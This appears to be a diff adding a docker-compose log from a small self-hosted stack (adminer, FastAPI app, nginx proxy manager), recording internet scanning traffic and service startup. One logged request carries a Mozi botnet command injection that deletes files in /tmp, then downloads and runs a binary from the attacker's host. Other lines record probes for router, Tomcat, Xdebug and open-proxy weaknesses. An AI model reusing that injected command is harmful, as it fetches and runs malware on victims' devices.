@@ -1,0 +1,1605 @@
+Attaching to nginx_webserver, nginx_proxy_manager, fastapi_app, adminer, postgres_db, nodejs_app
+[36madminer      |[0m [Tue Jul  9 17:03:42 2024] PHP 7.4.33 Development Server (http://[::]:8080) started
+[36madminer      |[0m [Tue Jul  9 17:03:57 2024] [::ffff:165.154.172.87]:51842 Accepted
+[36madminer      |[0m [Tue Jul  9 17:03:57 2024] [::ffff:165.154.172.87]:51842 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Tue Jul  9 17:03:57 2024] [::ffff:165.154.172.87]:51842 Closing
+[36madminer      |[0m [Tue Jul  9 17:03:58 2024] [::ffff:165.154.172.87]:51408 Accepted
+[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:51408 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:51408 Closing
+[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:48302 Accepted
+[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:48302 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:48302 Closing
+[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48306 Accepted
+[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48306 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48306 Closing
+[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48314 Accepted
+[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48314 [404]: GET /robots.txt - No such file or directory
+[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48314 Closing
+[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48316 Accepted
+[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48316 [404]: GET /sitemap.xml - No such file or directory
+[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48316 Closing
+[36madminer      |[0m [Tue Jul  9 17:37:45 2024] [::ffff:117.252.160.19]:53890 Accepted
+[36madminer      |[0m [Tue Jul  9 17:37:47 2024] [::ffff:117.252.160.19]:53890 [404]: GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://117.252.160.19:35600/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron - No such file or directory
+[36madminer      |[0m [Tue Jul  9 17:37:47 2024] [::ffff:117.252.160.19]:53890 Closing
+[36madminer      |[0m [Tue Jul  9 17:42:36 2024] [::ffff:212.102.57.145]:49718 Accepted
+[36madminer      |[0m [Tue Jul  9 17:42:36 2024] [::ffff:212.102.57.145]:49718 [200]: CONNECT karlshochschule.de:443
+[36madminer      |[0m [Tue Jul  9 17:42:36 2024] [::ffff:212.102.57.145]:49718 Closing
+[36madminer      |[0m [Tue Jul  9 17:42:37 2024] [::ffff:212.102.57.145]:49728 Accepted
+[36madminer      |[0m [Tue Jul  9 17:42:37 2024] [::ffff:212.102.57.145]:49728 [200]: CONNECT karlshochschule.de:443
+[36madminer      |[0m [Tue Jul  9 17:42:37 2024] [::ffff:212.102.57.145]:49728 Closing
+[36madminer      |[0m [Tue Jul  9 17:53:57 2024] [::ffff:88.214.193.144]:25174 Accepted
+[36madminer      |[0m [Tue Jul  9 17:53:57 2024] [::ffff:88.214.193.144]:25174 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Tue Jul  9 17:53:57 2024] [::ffff:88.214.193.144]:25174 Closing
+[36madminer      |[0m [Tue Jul  9 17:53:57 2024] [::ffff:88.214.193.144]:25270 Accepted
+[36madminer      |[0m [Tue Jul  9 17:53:57 2024] [::ffff:88.214.193.144]:25270 [200]: CONNECT azenv.0889.org:443
+[36madminer      |[0m [Tue Jul  9 17:53:57 2024] [::ffff:88.214.193.144]:25270 Closing
+[36madminer      |[0m [Tue Jul  9 18:20:32 2024] [::ffff:172.168.41.1]:57398 Accepted
+[36madminer      |[0m [Tue Jul  9 18:20:32 2024] [::ffff:172.168.41.1]:57398 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 18:20:32 2024] [::ffff:172.168.41.1]:57398 Closing
+[36madminer      |[0m [Tue Jul  9 19:14:42 2024] [::ffff:94.156.10.164]:47674 Accepted
+[36madminer      |[0m [Tue Jul  9 19:14:42 2024] [::ffff:94.156.10.164]:47674 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Tue Jul  9 19:14:42 2024] [::ffff:94.156.10.164]:47674 Closing
+[36madminer      |[0m [Tue Jul  9 19:23:59 2024] [::ffff:172.168.40.186]:43922 Accepted
+[36madminer      |[0m [Tue Jul  9 19:23:59 2024] [::ffff:172.168.40.186]:43922 [200]: GET /manager/text/list
+[36madminer      |[0m [Tue Jul  9 19:23:59 2024] [::ffff:172.168.40.186]:43922 Closing
+[36madminer      |[0m [Tue Jul  9 19:32:02 2024] [::ffff:23.95.200.178]:49224 Accepted
+[36madminer      |[0m [Tue Jul  9 19:32:02 2024] [::ffff:23.95.200.178]:49224 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 19:32:02 2024] [::ffff:23.95.200.178]:49224 Closing
+[36madminer      |[0m [Tue Jul  9 19:47:44 2024] [::ffff:87.121.69.27]:37834 Accepted
+[36madminer      |[0m [Tue Jul  9 19:47:44 2024] [::ffff:87.121.69.27]:37834 [200]: CONNECT google.com:443
+[36madminer      |[0m [Tue Jul  9 19:47:44 2024] [::ffff:87.121.69.27]:37834 Closing
+[36madminer      |[0m [Tue Jul  9 19:56:26 2024] [::ffff:83.97.73.245]:47978 Accepted
+[36madminer      |[0m [Tue Jul  9 19:56:26 2024] [::ffff:83.97.73.245]:47978 [200]: GET /?XDEBUG_SESSION_START=phpstorm
+[36madminer      |[0m [Tue Jul  9 19:56:26 2024] [::ffff:83.97.73.245]:47978 Closing
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48776 Accepted
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48776 [200]: CONNECT example.com:443
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48776 Closing
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48784 Accepted
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48784 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48784 Closing
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48786 Accepted
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48786 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48786 Closing
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48790 Accepted
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48790 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Tue Jul  9 20:13:59 2024] [::ffff:45.128.232.152]:48790 Closing
+[36madminer      |[0m [Tue Jul  9 20:27:23 2024] [::ffff:83.97.73.245]:53990 Accepted
+[36madminer      |[0m [Tue Jul  9 20:27:23 2024] [::ffff:83.97.73.245]:53990 [200]: GET /actuator/gateway/routes
+[36madminer      |[0m [Tue Jul  9 20:27:23 2024] [::ffff:83.97.73.245]:53990 Closing
+[36madminer      |[0m [Tue Jul  9 20:42:09 2024] [::ffff:87.121.69.27]:42188 Accepted
+[36madminer      |[0m [Tue Jul  9 20:42:09 2024] [::ffff:87.121.69.27]:42188 [200]: CONNECT google.com:443
+[36madminer      |[0m [Tue Jul  9 20:42:09 2024] [::ffff:87.121.69.27]:42188 Closing
+[36madminer      |[0m [Tue Jul  9 20:46:36 2024] [::ffff:167.94.145.109]:60810 Accepted
+[36madminer      |[0m [Tue Jul  9 20:46:39 2024] [::ffff:167.94.145.109]:60810 Invalid request (Connection reset by peer)
+[36madminer      |[0m [Tue Jul  9 20:46:39 2024] [::ffff:167.94.145.109]:60810 Closing
+[36madminer      |[0m [Tue Jul  9 20:46:39 2024] [::ffff:167.94.145.109]:60952 Accepted
+[36madminer      |[0m [Tue Jul  9 20:46:42 2024] [::ffff:167.94.145.109]:60952 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 20:46:42 2024] [::ffff:167.94.145.109]:60952 Closing
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53610 Accepted
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53610 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53610 Closing
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53620 Accepted
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53620 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53620 Closing
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53632 Accepted
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53632 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53632 Closing
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53638 Accepted
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53638 [404]: GET /favicon.ico - No such file or directory
+[36madminer      |[0m [Tue Jul  9 20:46:45 2024] [::ffff:167.94.145.109]:53638 Closing
+[36madminer      |[0m [Tue Jul  9 20:56:04 2024] [::ffff:94.156.71.235]:5790 Accepted
+[36madminer      |[0m [Tue Jul  9 20:56:04 2024] [::ffff:94.156.71.235]:5790 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Tue Jul  9 20:56:04 2024] [::ffff:94.156.71.235]:5790 Closing
+[36madminer      |[0m [Tue Jul  9 21:02:48 2024] [::ffff:94.156.10.163]:54552 Accepted
+[36madminer      |[0m [Tue Jul  9 21:02:48 2024] [::ffff:94.156.10.163]:54552 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Tue Jul  9 21:02:48 2024] [::ffff:94.156.10.163]:54552 Closing
+[36madminer      |[0m [Tue Jul  9 21:05:52 2024] [::ffff:147.185.132.120]:58884 Accepted
+[36madminer      |[0m [Tue Jul  9 21:05:52 2024] [::ffff:147.185.132.120]:58884 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Tue Jul  9 21:05:52 2024] [::ffff:147.185.132.120]:58884 Closing
+[36madminer      |[0m [Tue Jul  9 21:05:52 2024] [::ffff:147.185.132.120]:58886 Accepted
+[36madminer      |[0m [Tue Jul  9 21:05:52 2024] [::ffff:147.185.132.120]:58886 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Tue Jul  9 21:05:52 2024] [::ffff:147.185.132.120]:58886 Closing
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47440 Accepted
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47440 [200]: CONNECT example.com:443
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47440 Closing
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47450 Accepted
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47450 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47450 Closing
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47462 Accepted
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47462 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47462 Closing
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47468 Accepted
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47468 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Tue Jul  9 21:09:06 2024] [::ffff:45.128.232.152]:47468 Closing
+[36madminer      |[0m [Tue Jul  9 21:23:27 2024] [::ffff:94.156.10.164]:51764 Accepted
+[36madminer      |[0m [Tue Jul  9 21:23:27 2024] [::ffff:94.156.10.164]:51764 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Tue Jul  9 21:23:27 2024] [::ffff:94.156.10.164]:51764 Closing
+[36madminer      |[0m [Tue Jul  9 21:55:34 2024] [::ffff:172.18.0.1]:58064 Accepted
+[36madminer      |[0m [Tue Jul  9 21:55:34 2024] [::ffff:172.18.0.1]:58064 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 21:55:34 2024] [::ffff:172.18.0.1]:58064 Closing
+[36madminer      |[0m [Tue Jul  9 21:55:34 2024] [::ffff:172.18.0.1]:58072 Accepted
+[36madminer      |[0m [Tue Jul  9 21:55:34 2024] [::ffff:172.18.0.1]:58072 [200]: GET /?file=default.css&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 21:55:34 2024] [::ffff:172.18.0.1]:58072 Closing
+[36madminer      |[0m [Tue Jul  9 21:55:34 2024] [::ffff:172.18.0.1]:58076 Accepted
+[36madminer      |[0m [Tue Jul  9 21:55:34 2024] [::ffff:172.18.0.1]:58076 [200]: GET /?file=functions.js&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 21:55:34 2024] [::ffff:172.18.0.1]:58076 Closing
+[36madminer      |[0m [Tue Jul  9 21:55:35 2024] [::ffff:172.18.0.1]:58092 Accepted
+[36madminer      |[0m [Tue Jul  9 21:55:35 2024] [::ffff:172.18.0.1]:58092 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 21:55:35 2024] [::ffff:172.18.0.1]:58092 Closing
+[36madminer      |[0m [Tue Jul  9 21:55:36 2024] [::ffff:172.18.0.1]:58100 Accepted
+[36madminer      |[0m [Tue Jul  9 21:55:36 2024] [::ffff:172.18.0.1]:58100 [200]: POST /?script=version
+[36madminer      |[0m [Tue Jul  9 21:55:36 2024] [::ffff:172.18.0.1]:58100 Closing
+[36madminer      |[0m [Tue Jul  9 21:59:52 2024] [::ffff:172.18.0.1]:39926 Accepted
+[36madminer      |[0m [Tue Jul  9 21:59:52 2024] [::ffff:172.18.0.1]:39926 [302]: POST /
+[36madminer      |[0m [Tue Jul  9 21:59:52 2024] [::ffff:172.18.0.1]:39926 Closing
+[36madminer      |[0m [Tue Jul  9 21:59:52 2024] [::ffff:172.18.0.1]:39934 Accepted
+[36madminer      |[0m [Tue Jul  9 21:59:52 2024] [::ffff:172.18.0.1]:39934 [403]: GET /?server=db&username=app&db=app
+[36madminer      |[0m [Tue Jul  9 21:59:52 2024] [::ffff:172.18.0.1]:39934 Closing
+[36madminer      |[0m [Tue Jul  9 21:59:53 2024] [::ffff:172.18.0.1]:39944 Accepted
+[36madminer      |[0m [Tue Jul  9 21:59:53 2024] [::ffff:172.18.0.1]:39944 [200]: GET /?file=default.css&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 21:59:53 2024] [::ffff:172.18.0.1]:39944 Closing
+[36madminer      |[0m [Tue Jul  9 21:59:53 2024] [::ffff:172.18.0.1]:39958 Accepted
+[36madminer      |[0m [Tue Jul  9 21:59:53 2024] [::ffff:172.18.0.1]:39958 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 21:59:53 2024] [::ffff:172.18.0.1]:39958 Closing
+[36madminer      |[0m [Tue Jul  9 22:00:06 2024] [::ffff:172.18.0.1]:39924 Accepted
+[36madminer      |[0m [Tue Jul  9 22:00:06 2024] [::ffff:172.18.0.1]:39924 [302]: POST /?server=db&username=app&db=app
+[36madminer      |[0m [Tue Jul  9 22:00:06 2024] [::ffff:172.18.0.1]:39924 Closing
+[36madminer      |[0m [Tue Jul  9 22:00:06 2024] [::ffff:172.18.0.1]:39930 Accepted
+[36madminer      |[0m [Tue Jul  9 22:00:06 2024] [::ffff:172.18.0.1]:39930 [403]: GET /?server=db&username=app&db=db
+[36madminer      |[0m [Tue Jul  9 22:00:06 2024] [::ffff:172.18.0.1]:39930 Closing
+[36madminer      |[0m [Tue Jul  9 22:00:06 2024] [::ffff:172.18.0.1]:39938 Accepted
+[36madminer      |[0m [Tue Jul  9 22:00:06 2024] [::ffff:172.18.0.1]:39938 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 22:00:06 2024] [::ffff:172.18.0.1]:39938 Closing
+[36madminer      |[0m [Tue Jul  9 22:00:07 2024] [::ffff:172.18.0.1]:39954 Accepted
+[36madminer      |[0m [Tue Jul  9 22:00:07 2024] [::ffff:172.18.0.1]:39954 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 22:00:07 2024] [::ffff:172.18.0.1]:39954 Closing
+[36madminer      |[0m [Tue Jul  9 22:00:25 2024] [::ffff:172.18.0.1]:44404 Accepted
+[36madminer      |[0m [Tue Jul  9 22:00:25 2024] [::ffff:172.18.0.1]:44404 [302]: POST /?server=db&username=app&db=db
+[36madminer      |[0m [Tue Jul  9 22:00:25 2024] [::ffff:172.18.0.1]:44404 Closing
+[36madminer      |[0m [Tue Jul  9 22:00:25 2024] [::ffff:172.18.0.1]:44418 Accepted
+[36madminer      |[0m [Tue Jul  9 22:00:25 2024] [::ffff:172.18.0.1]:44418 [403]: GET /?server=db&username=app&db=app
+[36madminer      |[0m [Tue Jul  9 22:00:25 2024] [::ffff:172.18.0.1]:44418 Closing
+[36madminer      |[0m [Tue Jul  9 22:00:25 2024] [::ffff:172.18.0.1]:44424 Accepted
+[36madminer      |[0m [Tue Jul  9 22:00:25 2024] [::ffff:172.18.0.1]:44424 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 22:00:25 2024] [::ffff:172.18.0.1]:44424 Closing
+[36madminer      |[0m [Tue Jul  9 22:11:01 2024] [::ffff:40.118.214.20]:40584 Accepted
+[36madminer      |[0m [Tue Jul  9 22:11:01 2024] [::ffff:40.118.214.20]:40584 [200]: GET /actuator/health
+[36madminer      |[0m [Tue Jul  9 22:11:01 2024] [::ffff:40.118.214.20]:40584 Closing
+[36madminer      |[0m [Tue Jul  9 22:27:45 2024] [::ffff:172.18.0.1]:44874 Accepted
+[36madminer      |[0m [Tue Jul  9 22:27:45 2024] [::ffff:172.18.0.1]:44874 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 22:27:45 2024] [::ffff:172.18.0.1]:44874 Closing
+[36madminer      |[0m [Tue Jul  9 22:32:33 2024] [::ffff:172.18.0.1]:49080 Accepted
+[36madminer      |[0m [Tue Jul  9 22:32:33 2024] [::ffff:172.18.0.1]:49080 [403]: GET /?server=db&username=app&db=app
+[36madminer      |[0m [Tue Jul  9 22:32:33 2024] [::ffff:172.18.0.1]:49080 Closing
+[36madminer      |[0m [Tue Jul  9 22:32:33 2024] [::ffff:172.18.0.1]:49092 Accepted
+[36madminer      |[0m [Tue Jul  9 22:32:33 2024] [::ffff:172.18.0.1]:49092 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Tue Jul  9 22:32:33 2024] [::ffff:172.18.0.1]:49092 Closing
+[36madminer      |[0m [Tue Jul  9 22:36:29 2024] [::ffff:94.156.10.164]:55898 Accepted
+[36madminer      |[0m [Tue Jul  9 22:36:29 2024] [::ffff:94.156.10.164]:55898 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Tue Jul  9 22:36:29 2024] [::ffff:94.156.10.164]:55898 Closing
+[36madminer      |[0m [Tue Jul  9 22:42:21 2024] [::ffff:182.253.69.114]:33739 Accepted
+[36madminer      |[0m [Tue Jul  9 22:42:21 2024] [::ffff:182.253.69.114]:33739 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 22:42:21 2024] [::ffff:182.253.69.114]:33739 Closing
+[36madminer      |[0m [Tue Jul  9 23:40:14 2024] [::ffff:59.178.184.237]:50158 Accepted
+[36madminer      |[0m [Tue Jul  9 23:40:14 2024] [::ffff:59.178.184.237]:50158 [200]: GET /
+[36madminer      |[0m [Tue Jul  9 23:40:14 2024] [::ffff:59.178.184.237]:50158 Closing
+[36madminer      |[0m [Tue Jul  9 23:47:10 2024] [::ffff:94.156.10.163]:58816 Accepted
+[33mfastapi_app  |[0m INFO:__main__:Initializing service
+[33mfastapi_app  |[0m INFO:__main__:Starting call to '__main__.init', this is the 1st time calling it.
+[33mfastapi_app  |[0m INFO:__main__:Service finished initializing
+[33mfastapi_app  |[0m INFO  [alembic.runtime.migration] Context impl PostgresqlImpl.
+[33mfastapi_app  |[0m INFO  [alembic.runtime.migration] Will assume transactional DDL.
+[33mfastapi_app  |[0m INFO:__main__:Creating initial data
+[33mfastapi_app  |[0m INFO:__main__:Initial data created
+[33mfastapi_app  |[0m Poetry (version 1.8.3)
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m Usage:
+[33mfastapi_app  |[0m   command [options] [arguments]
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m Options:
+[33mfastapi_app  |[0m   -h, --help                 Display help for the given command. When no command is given display help for the list command.
+[33mfastapi_app  |[0m   -q, --quiet                Do not output any message.
+[33mfastapi_app  |[0m   -V, --version              Display this application version.
+[33mfastapi_app  |[0m       --ansi                 Force ANSI output.
+[33mfastapi_app  |[0m       --no-ansi              Disable ANSI output.
+[33mfastapi_app  |[0m   -n, --no-interaction       Do not ask any interactive question.
+[33mfastapi_app  |[0m       --no-plugins           Disables plugins.
+[33mfastapi_app  |[0m       --no-cache             Disables Poetry source caches.
+[33mfastapi_app  |[0m   -C, --directory=DIRECTORY  The working directory for the Poetry command (defaults to the current working directory).
+[33mfastapi_app  |[0m   -v|vv|vvv, --verbose       Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m Available commands:
+[33mfastapi_app  |[0m   about              Shows information about Poetry.
+[33mfastapi_app  |[0m   add                Adds a new dependency to pyproject.toml and installs it.
+[33mfastapi_app  |[0m   build              Builds a package, as a tarball and a wheel by default.
+[33mfastapi_app  |[0m   check              Validates the content of the pyproject.toml file and its consistency with the poetry.lock file.
+[33mfastapi_app  |[0m   config             Manages configuration settings.
+[33mfastapi_app  |[0m   export             Exports the lock file to alternative formats.
+[33mfastapi_app  |[0m   help               Displays help for a command.
+[33mfastapi_app  |[0m   init               Creates a basic pyproject.toml file in the current directory.
+[33mfastapi_app  |[0m   install            Installs the project dependencies.
+[33mfastapi_app  |[0m   list               Lists commands.
+[33mfastapi_app  |[0m   lock               Locks the project dependencies.
+[33mfastapi_app  |[0m   new                Creates a new Python project at <path>.
+[33mfastapi_app  |[0m   publish            Publishes a package to a remote repository.
+[33mfastapi_app  |[0m   remove             Removes a package from the project dependencies.
+[33mfastapi_app  |[0m   run                Runs a command in the appropriate environment.
+[33mfastapi_app  |[0m   search             Searches for packages on remote repositories.
+[33mfastapi_app  |[0m   shell              Spawns a shell within the virtual environment.
+[33mfastapi_app  |[0m   show               Shows information about packages.
+[33mfastapi_app  |[0m   update             Update the dependencies as according to the pyproject.toml file.
+[33mfastapi_app  |[0m   version            Shows the version of the project or bumps it when a valid bump rule is provided.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  cache
+[33mfastapi_app  |[0m   cache clear        Clears a Poetry cache by name.
+[33mfastapi_app  |[0m   cache list         List Poetry's caches.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  debug
+[33mfastapi_app  |[0m   debug info         Shows debug information.
+[33mfastapi_app  |[0m   debug resolve      Debugs dependency resolution.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  env
+[33mfastapi_app  |[0m   env info           Displays information about the current environment.
+[33mfastapi_app  |[0m   env list           Lists all virtualenvs associated with the current project.
+[33mfastapi_app  |[0m   env remove         Remove virtual environments associated with the project.
+[33mfastapi_app  |[0m   env use            Activates or creates a new virtualenv for the current project.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  self
+[33mfastapi_app  |[0m   self add           Add additional packages to Poetry's runtime environment.
+[33mfastapi_app  |[0m   self install       Install locked packages (incl. addons) required by this Poetry installation.
+[33mfastapi_app  |[0m   self lock          Lock the Poetry installation's system requirements.
+[33mfastapi_app  |[0m   self remove        Remove additional packages from Poetry's runtime environment.
+[33mfastapi_app  |[0m   self show          Show packages from Poetry's runtime environment.
+[33mfastapi_app  |[0m   self show plugins  Shows information about the currently installed plugins.
+[33mfastapi_app  |[0m   self update        Updates Poetry to the latest version.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  source
+[33mfastapi_app  |[0m   source add         Add source configuration for project.
+[33mfastapi_app  |[0m   source remove      Remove source configured for the project.
+[33mfastapi_app  |[0m   source show        Show information about sources configured for the project.
+[33mfastapi_app  |[0m INFO:__main__:Initializing service
+[33mfastapi_app  |[0m INFO:__main__:Starting call to '__main__.init', this is the 1st time calling it.
+[33mfastapi_app  |[0m INFO:__main__:Service finished initializing
+[33mfastapi_app  |[0m INFO  [alembic.runtime.migration] Context impl PostgresqlImpl.
+[33mfastapi_app  |[0m INFO  [alembic.runtime.migration] Will assume transactional DDL.
+[33mfastapi_app  |[0m INFO:__main__:Creating initial data
+[32mnginx_proxy_manager |[0m [1;34m❯ [1;36mConfiguring npm user ...[0m
+[32mnginx_proxy_manager |[0m useradd warning: npm's uid 0 outside of the UID_MIN 1000 and UID_MAX 60000 range.
+[32mnginx_proxy_manager |[0m [1;34m❯ [1;36mConfiguring npm group ...[0m
+[32mnginx_proxy_manager |[0m [1;34m❯ [1;36mChecking paths ...[0m
+[32mnginx_proxy_manager |[0m [1;34m❯ [1;36mSetting ownership ...[0m
+[32mnginx_proxy_manager |[0m [1;34m❯ [1;36mDynamic resolvers ...[0m
+[32mnginx_proxy_manager |[0m [1;34m❯ [1;36mIPv6 ...[0m
+[32mnginx_proxy_manager |[0m Enabling IPV6 in hosts in: /etc/nginx/conf.d
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/default.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/production.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/include/ip_ranges.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/include/proxy.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/include/block-exploits.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/include/ssl-ciphers.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/include/force-ssl.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/include/log.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/include/assets.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/include/letsencrypt-acme-challenge.conf
+[32mnginx_proxy_manager |[0m - /etc/nginx/conf.d/include/resolvers.conf
+[32mnginx_proxy_manager |[0m Enabling IPV6 in hosts in: /data/nginx
+[32mnginx_proxy_manager |[0m [1;34m❯ [1;36mDocker secrets ...[0m
+[32mnginx_proxy_manager |[0m 
+[32mnginx_proxy_manager |[0m -------------------------------------
+[32mnginx_proxy_manager |[0m  _   _ ____  __  __
+[32mnginx_proxy_manager |[0m | \ | |  _ \|  \/  |
+[32mnginx_proxy_manager |[0m |  \| | |_) | |\/| |
+[32mnginx_proxy_manager |[0m | |\  |  __/| |  | |
+[32mnginx_proxy_manager |[0m |_| \_|_|   |_|  |_|
+[32mnginx_proxy_manager |[0m -------------------------------------
+[32mnginx_proxy_manager |[0m User:  npm PUID:0 ID:0 GROUP:0
+[32mnginx_proxy_manager |[0m Group: npm PGID:0 ID:0
+[32mnginx_proxy_manager |[0m -------------------------------------
+[32mnginx_proxy_manager |[0m 
+[32mnginx_proxy_manager |[0m [1;34m❯ [1;36mStarting nginx ...[0m
+[32mnginx_proxy_manager |[0m [1;34m❯ [1;36mStarting backend ...[0m
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:47 PM] [Global   ] › ℹ  info      Using Sqlite: /data/database.sqlite
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:52 PM] [Migrate  ] › ℹ  info      Current database version: none
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [Setup    ] › ℹ  info      Logrotate Timer initialized
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [Global   ] › ⬤  debug     CMD: logrotate /etc/logrotate.d/nginx-proxy-manager
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [Setup    ] › ℹ  info      Logrotate completed.
+[32mnginx_proxy_manager |[0m [7/9/2024] [5:03:53 PM] [IP Ranges] › ℹ  info      Fetching IP Ranges from online services...
